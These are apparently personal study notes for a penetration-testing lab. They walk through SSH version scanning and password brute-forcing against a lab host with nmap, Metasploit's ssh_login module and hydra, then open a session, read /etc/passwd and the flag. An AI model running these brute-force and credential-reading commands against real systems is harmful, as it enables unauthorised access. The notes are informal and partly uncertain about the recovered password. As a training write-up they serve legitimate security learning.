# SSH Login

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2877–2926. Examples are lab-specific and need verification.

SSH (Secure Shell) is a network protocol that allows secure access to remote systems over an unsecured network. It provides encrypted communication between a client and a server, typically used for remote administration, file transfers, and tunneling.

In this lab, we will look at a couple of SSH related metasploit modules and run them against the target.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running an SSH service will be accessible at **demo.ine.local**.

**Objective:** Your task is to run the following auxiliary modules against the target:

- auxiliary/scanner/ssh/ssh_version
- auxiliary/scanner/ssh/ssh_login

The following username and password dictionary will be useful: - /usr/share/metasploit-framework/data/wordlists/common_users.txt - /usr/share/metasploit-framework/data/wordlists/common_passwords.txt

Tools: nmap, metasploit framework

```bash
nmap -sS -sV demo.ine.local
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit

use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit                   //got sysadmin:ha

sessions               //after exploit sessions created and no meterpreter come but command here
sessions -i 1
find / -name "flag"
cat /flag

**or another way::::not prefer**
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ssh
ssh sysadmin@demo.ine.local
pass:haily not sure got from msf or hydra

sysadmin@demo:$ whoami
sysadmin@demo:$ls -la
sysadmin@demo:$cat /etc/passwd
sysadmin@demo:$find / -name "flag"
sysadmin@demo:$cat /flag

```
